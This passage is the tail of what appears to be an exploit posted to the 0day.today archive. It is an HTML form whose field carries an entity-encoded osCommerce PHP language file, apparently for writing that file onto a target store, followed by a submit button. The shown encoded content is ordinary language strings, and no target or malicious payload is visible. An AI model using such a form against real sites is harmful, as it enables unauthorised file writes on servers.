AME&apos;&#44;&#32;&apos;First&#32;Name&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;FIRST&#95;NAME&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;First&#32;Name&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;FIRST&#95;NAME&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;FIRST&#95;NAME&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;LAST&#95;NAME&apos;&#44;&#32;&apos;Last&#32;Name&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;LAST&#95;NAME&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Last&#32;Name&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;LAST&#95;NAME&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;LAST&#95;NAME&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;DATE&#95;OF&#95;BIRTH&apos;&#44;&#32;&apos;Date&#32;of&#32;Birth&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;DATE&#95;OF&#95;BIRTH&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Date&#32;of&#32;Birth&#32;must&#32;be&#32;in&#32;this&#32;format&#58;&#32;MM&#47;DD&#47;YYYY&#32;&#40;eg&#32;05&#47;21&#47;1970&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;DATE&#95;OF&#95;BIRTH&#95;TEXT&apos;&#44;&#32;&apos;&#42;&#32;&#40;eg&#46;&#32;05&#47;21&#47;1970&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;EMAIL&#95;ADDRESS&apos;&#44;&#32;&apos;E&#45;Mail&#32;Address&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;EMAIL&#95;ADDRESS&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;E&#45;Mail&#32;Address&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;EMAIL&#95;ADDRESS&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;EMAIL&#95;ADDRESS&#95;CHECK&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;E&#45;Mail&#32;Address&#32;does&#32;not&#32;appear&#32;to&#32;be&#32;valid&#32;&#45;&#32;please&#32;make&#32;any&#32;necessary&#32;corrections&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;EMAIL&#95;ADDRESS&#95;ERROR&#95;EXISTS&apos;&#44;&#32;&apos;Your&#32;E&#45;Mail&#32;Address&#32;already&#32;exists&#32;in&#32;our&#32;records&#32;&#45;&#32;please&#32;log&#32;in&#32;with&#32;the&#32;e&#45;mail&#32;address&#32;or&#32;create&#32;an&#32;account&#32;with&#32;a&#32;different&#32;address&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;EMAIL&#95;ADDRESS&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STREET&#95;ADDRESS&apos;&#44;&#32;&apos;Street&#32;Address&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STREET&#95;ADDRESS&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Street&#32;Address&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;STREET&#95;ADDRESS&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STREET&#95;ADDRESS&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;SUBURB&apos;&#44;&#32;&apos;Suburb&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;SUBURB&#95;TEXT&apos;&#44;&#32;&apos;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;POST&#95;CODE&apos;&#44;&#32;&apos;Post&#32;Code&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;POST&#95;CODE&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Post&#32;Code&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;POSTCODE&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;POST&#95;CODE&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;CITY&apos;&#44;&#32;&apos;City&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;CITY&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;City&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;CITY&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;CITY&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STATE&apos;&#44;&#32;&apos;State&#47;Province&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STATE&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;State&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;STATE&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STATE&#95;ERROR&#95;SELECT&apos;&#44;&#32;&apos;Please&#32;select&#32;a&#32;state&#32;from&#32;the&#32;States&#32;pull&#32;down&#32;menu&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;STATE&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;COUNTRY&apos;&#44;&#32;&apos;Country&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;COUNTRY&#95;ERROR&apos;&#44;&#32;&apos;You&#32;must&#32;select&#32;a&#32;country&#32;from&#32;the&#32;Countries&#32;pull&#32;down&#32;menu&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;COUNTRY&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;TELEPHONE&#95;NUMBER&apos;&#44;&#32;&apos;Telephone&#32;Number&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;TELEPHONE&#95;NUMBER&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Telephone&#32;Number&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;TELEPHONE&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;TELEPHONE&#95;NUMBER&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;FAX&#95;NUMBER&apos;&#44;&#32;&apos;Fax&#32;Number&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;FAX&#95;NUMBER&#95;TEXT&apos;&#44;&#32;&apos;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;NEWSLETTER&apos;&#44;&#32;&apos;Newsletter&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;NEWSLETTER&#95;TEXT&apos;&#44;&#32;&apos;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;NEWSLETTER&#95;YES&apos;&#44;&#32;&apos;Subscribed&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;NEWSLETTER&#95;NO&apos;&#44;&#32;&apos;Unsubscribed&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&apos;&#44;&#32;&apos;Password&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Password&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;PASSWORD&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;ERROR&#95;NOT&#95;MATCHING&apos;&#44;&#32;&apos;The&#32;Password&#32;Confirmation&#32;must&#32;match&#32;your&#32;Password&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;CONFIRMATION&apos;&#44;&#32;&apos;Password&#32;Confirmation&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;CONFIRMATION&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;CURRENT&apos;&#44;&#32;&apos;Current&#32;Password&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;CURRENT&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;CURRENT&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;Password&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;PASSWORD&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;NEW&apos;&#44;&#32;&apos;New&#32;Password&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;NEW&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;NEW&#95;ERROR&apos;&#44;&#32;&apos;Your&#32;new&#32;Password&#32;must&#32;contain&#32;a&#32;minimum&#32;of&#32;&apos;&#32;&#46;&#32;ENTRY&#95;PASSWORD&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;PASSWORD&#95;NEW&#95;ERROR&#95;NOT&#95;MATCHING&apos;&#44;&#32;&apos;The&#32;Password&#32;Confirmation&#32;must&#32;match&#32;your&#32;new&#32;Password&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PASSWORD&#95;HIDDEN&apos;&#44;&#32;&apos;&#45;&#45;HIDDEN&#45;&#45;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;FORM&#95;REQUIRED&#95;INFORMATION&apos;&#44;&#32;&apos;&#42;&#32;Required&#32;information&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;constants&#32;for&#32;use&#32;in&#32;tep&#95;prev&#95;next&#95;display&#32;function&#13;&#10;define&#40;&apos;TEXT&#95;RESULT&#95;PAGE&apos;&#44;&#32;&apos;Result&#32;Pages&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DISPLAY&#95;NUMBER&#95;OF&#95;PRODUCTS&apos;&#44;&#32;&apos;Displaying&#32;<strong>&#37;d<&#47;strong>&#32;to&#32;<strong>&#37;d<&#47;strong>&#32;&#40;of&#32;<strong>&#37;d<&#47;strong>&#32;products&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DISPLAY&#95;NUMBER&#95;OF&#95;ORDERS&apos;&#44;&#32;&apos;Displaying&#32;<strong>&#37;d<&#47;strong>&#32;to&#32;<strong>&#37;d<&#47;strong>&#32;&#40;of&#32;<strong>&#37;d<&#47;strong>&#32;orders&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DISPLAY&#95;NUMBER&#95;OF&#95;REVIEWS&apos;&#44;&#32;&apos;Displaying&#32;<strong>&#37;d<&#47;strong>&#32;to&#32;<strong>&#37;d<&#47;strong>&#32;&#40;of&#32;<strong>&#37;d<&#47;strong>&#32;reviews&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DISPLAY&#95;NUMBER&#95;OF&#95;PRODUCTS&#95;NEW&apos;&#44;&#32;&apos;Displaying&#32;<strong>&#37;d<&#47;strong>&#32;to&#32;<strong>&#37;d<&#47;strong>&#32;&#40;of&#32;<strong>&#37;d<&#47;strong>&#32;new&#32;products&#41;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DISPLAY&#95;NUMBER&#95;OF&#95;SPECIALS&apos;&#44;&#32;&apos;Displaying&#32;<strong>&#37;d<&#47;strong>&#32;to&#32;<strong>&#37;d<&#47;strong>&#32;&#40;of&#32;<strong>&#37;d<&#47;strong>&#32;specials&#41;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;FIRST&#95;PAGE&apos;&#44;&#32;&apos;First&#32;Page&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;PREVIOUS&#95;PAGE&apos;&#44;&#32;&apos;Previous&#32;Page&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;NEXT&#95;PAGE&apos;&#44;&#32;&apos;Next&#32;Page&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;LAST&#95;PAGE&apos;&#44;&#32;&apos;Last&#32;Page&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;PAGE&#95;NO&apos;&#44;&#32;&apos;Page&#32;&#37;d&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;PREV&#95;SET&#95;OF&#95;NO&#95;PAGE&apos;&#44;&#32;&apos;Previous&#32;Set&#32;of&#32;&#37;d&#32;Pages&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;TITLE&#95;NEXT&#95;SET&#95;OF&#95;NO&#95;PAGE&apos;&#44;&#32;&apos;Next&#32;Set&#32;of&#32;&#37;d&#32;Pages&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;BUTTON&#95;FIRST&apos;&#44;&#32;&apos;&amp;lt&#59;&amp;lt&#59;FIRST&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;BUTTON&#95;PREV&apos;&#44;&#32;&apos;&#91;&amp;lt&#59;&amp;lt&#59;&amp;nbsp&#59;Prev&#93;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;BUTTON&#95;NEXT&apos;&#44;&#32;&apos;&#91;Next&amp;nbsp&#59;&amp;gt&#59;&amp;gt&#59;&#93;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;PREVNEXT&#95;BUTTON&#95;LAST&apos;&#44;&#32;&apos;LAST&amp;gt&#59;&amp;gt&#59;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;ADD&#95;ADDRESS&apos;&#44;&#32;&apos;Add&#32;Address&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;ADDRESS&#95;BOOK&apos;&#44;&#32;&apos;Address&#32;Book&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;BACK&apos;&#44;&#32;&apos;Back&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;BUY&#95;NOW&apos;&#44;&#32;&apos;Buy&#32;Now&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;CHANGE&#95;ADDRESS&apos;&#44;&#32;&apos;Change&#32;Address&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;CHECKOUT&apos;&#44;&#32;&apos;Checkout&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;CONFIRM&#95;ORDER&apos;&#44;&#32;&apos;Confirm&#32;Order&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;CONTINUE&apos;&#44;&#32;&apos;Continue&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;CONTINUE&#95;SHOPPING&apos;&#44;&#32;&apos;Continue&#32;Shopping&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;DELETE&apos;&#44;&#32;&apos;Delete&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;EDIT&#95;ACCOUNT&apos;&#44;&#32;&apos;Edit&#32;Account&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;HISTORY&apos;&#44;&#32;&apos;Order&#32;History&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;LOGIN&apos;&#44;&#32;&apos;Sign&#32;In&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;IN&#95;CART&apos;&#44;&#32;&apos;Add&#32;to&#32;Cart&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;NOTIFICATIONS&apos;&#44;&#32;&apos;Notifications&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;QUICK&#95;FIND&apos;&#44;&#32;&apos;Quick&#32;Find&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;REMOVE&#95;NOTIFICATIONS&apos;&#44;&#32;&apos;Remove&#32;Notifications&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;REVIEWS&apos;&#44;&#32;&apos;Reviews&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;SEARCH&apos;&#44;&#32;&apos;Search&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;SHIPPING&#95;OPTIONS&apos;&#44;&#32;&apos;Shipping&#32;Options&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;TELL&#95;A&#95;FRIEND&apos;&#44;&#32;&apos;Tell&#32;a&#32;Friend&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;UPDATE&apos;&#44;&#32;&apos;Update&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;UPDATE&#95;CART&apos;&#44;&#32;&apos;Update&#32;Cart&apos;&#41;&#59;&#13;&#10;define&#40;&apos;IMAGE&#95;BUTTON&#95;WRITE&#95;REVIEW&apos;&#44;&#32;&apos;Write&#32;Review&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;SMALL&#95;IMAGE&#95;BUTTON&#95;DELETE&apos;&#44;&#32;&apos;Delete&apos;&#41;&#59;&#13;&#10;define&#40;&apos;SMALL&#95;IMAGE&#95;BUTTON&#95;EDIT&apos;&#44;&#32;&apos;Edit&apos;&#41;&#59;&#13;&#10;define&#40;&apos;SMALL&#95;IMAGE&#95;BUTTON&#95;VIEW&apos;&#44;&#32;&apos;View&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;ICON&#95;ARROW&#95;RIGHT&apos;&#44;&#32;&apos;more&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ICON&#95;CART&apos;&#44;&#32;&apos;In&#32;Cart&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ICON&#95;ERROR&apos;&#44;&#32;&apos;Error&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ICON&#95;SUCCESS&apos;&#44;&#32;&apos;Success&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ICON&#95;WARNING&apos;&#44;&#32;&apos;Warning&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;GREETING&#95;PERSONAL&apos;&#44;&#32;&apos;Welcome&#32;back&#32;<span&#32;class&#61;&quot;greetUser&quot;>&#37;s&#33;<&#47;span>&#32;Would&#32;you&#32;like&#32;to&#32;see&#32;which&#32;<a&#32;href&#61;&quot;&#37;s&quot;><u>new&#32;products<&#47;u><&#47;a>&#32;are&#32;available&#32;to&#32;purchase&#63;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;GREETING&#95;PERSONAL&#95;RELOGON&apos;&#44;&#32;&apos;<small>If&#32;you&#32;are&#32;not&#32;&#37;s&#44;&#32;please&#32;<a&#32;href&#61;&quot;&#37;s&quot;><u>log&#32;yourself&#32;in<&#47;u><&#47;a>&#32;with&#32;your&#32;account&#32;information&#46;<&#47;small>&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;GREETING&#95;GUEST&apos;&#44;&#32;&apos;Welcome&#32;<span&#32;class&#61;&quot;greetUser&quot;>Guest&#33;<&#47;span>&#32;Would&#32;you&#32;like&#32;to&#32;<a&#32;href&#61;&quot;&#37;s&quot;><u>log&#32;yourself&#32;in<&#47;u><&#47;a>&#63;&#32;Or&#32;would&#32;you&#32;prefer&#32;to&#32;<a&#32;href&#61;&quot;&#37;s&quot;><u>create&#32;an&#32;account<&#47;u><&#47;a>&#63;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;SORT&#95;PRODUCTS&apos;&#44;&#32;&apos;Sort&#32;products&#32;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;DESCENDINGLY&apos;&#44;&#32;&apos;descendingly&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;ASCENDINGLY&apos;&#44;&#32;&apos;ascendingly&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;BY&apos;&#44;&#32;&apos;&#32;by&#32;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;REVIEW&#95;BY&apos;&#44;&#32;&apos;by&#32;&#37;s&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;REVIEW&#95;WORD&#95;COUNT&apos;&#44;&#32;&apos;&#37;s&#32;words&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;REVIEW&#95;RATING&apos;&#44;&#32;&apos;Rating&#58;&#32;&#37;s&#32;&#91;&#37;s&#93;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;REVIEW&#95;DATE&#95;ADDED&apos;&#44;&#32;&apos;Date&#32;Added&#58;&#32;&#37;s&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;NO&#95;REVIEWS&apos;&#44;&#32;&apos;There&#32;are&#32;currently&#32;no&#32;product&#32;reviews&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;NO&#95;NEW&#95;PRODUCTS&apos;&#44;&#32;&apos;There&#32;are&#32;currently&#32;no&#32;products&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;UNKNOWN&#95;TAX&#95;RATE&apos;&#44;&#32;&apos;Unknown&#32;tax&#32;rate&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;REQUIRED&apos;&#44;&#32;&apos;<span&#32;class&#61;&quot;errorText&quot;>Required<&#47;span>&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;ERROR&#95;TEP&#95;MAIL&apos;&#44;&#32;&apos;<font&#32;face&#61;&quot;Verdana&#44;&#32;Arial&quot;&#32;size&#61;&quot;2&quot;&#32;color&#61;&quot;&#35;ff0000&quot;><strong><small>TEP&#32;ERROR&#58;<&#47;small>&#32;Cannot&#32;send&#32;the&#32;email&#32;through&#32;the&#32;specified&#32;SMTP&#32;server&#46;&#32;Please&#32;check&#32;your&#32;php&#46;ini&#32;setting&#32;and&#32;correct&#32;the&#32;SMTP&#32;server&#32;if&#32;necessary&#46;<&#47;strong><&#47;font>&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;TEXT&#95;CCVAL&#95;ERROR&#95;INVALID&#95;DATE&apos;&#44;&#32;&apos;The&#32;expiry&#32;date&#32;entered&#32;for&#32;the&#32;credit&#32;card&#32;is&#32;invalid&#46;&#32;Please&#32;check&#32;the&#32;date&#32;and&#32;try&#32;again&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;CCVAL&#95;ERROR&#95;INVALID&#95;NUMBER&apos;&#44;&#32;&apos;The&#32;credit&#32;card&#32;number&#32;entered&#32;is&#32;invalid&#46;&#32;Please&#32;check&#32;the&#32;number&#32;and&#32;try&#32;again&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TEXT&#95;CCVAL&#95;ERROR&#95;UNKNOWN&#95;CARD&apos;&#44;&#32;&apos;The&#32;first&#32;four&#32;digits&#32;of&#32;the&#32;number&#32;entered&#32;are&#58;&#32;&#37;s&#46;&#32;If&#32;that&#32;number&#32;is&#32;correct&#44;&#32;we&#32;do&#32;not&#32;accept&#32;that&#32;type&#32;of&#32;credit&#32;card&#46;&#32;If&#32;it&#32;is&#32;wrong&#44;&#32;please&#32;try&#32;again&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;FOOTER&#95;TEXT&#95;BODY&apos;&#44;&#32;&apos;Copyright&#32;&amp;copy&#59;&#32;&apos;&#32;&#46;&#32;date&#40;&apos;Y&apos;&#41;&#32;&#46;&#32;&apos;&#32;<a&#32;href&#61;&quot;&apos;&#32;&#46;&#32;tep&#95;href&#95;link&#40;FILENAME&#95;DEFAULT&#41;&#32;&#46;&#32;&apos;&quot;>&apos;&#32;&#46;&#32;STORE&#95;NAME&#32;&#46;&#32;&apos;<&#47;a><br&#32;&#47;>Powered&#32;by&#32;<a&#32;href&#61;&quot;http&#58;&#47;&#47;www&#46;oscommerce&#46;com&quot;&#32;target&#61;&quot;&#95;blank&quot;>osCommerce<&#47;a>&apos;&#41;&#59;&#13;&#10;&#63;>&#13;&#10;" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+#  0day.today [2023-03-23]  #
